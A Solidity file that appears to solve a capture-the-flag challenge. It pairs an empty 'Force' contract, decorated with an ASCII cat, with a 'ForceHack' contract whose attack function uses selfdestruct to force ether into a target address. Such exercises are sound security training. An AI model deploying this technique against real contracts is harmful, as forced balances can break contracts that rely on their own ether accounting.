// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract ForceHack {
    address payable public target;

    constructor(address _target) public {
        target = payable(_target);
    }

    function attack() external payable {
        selfdestruct(target);
    }
}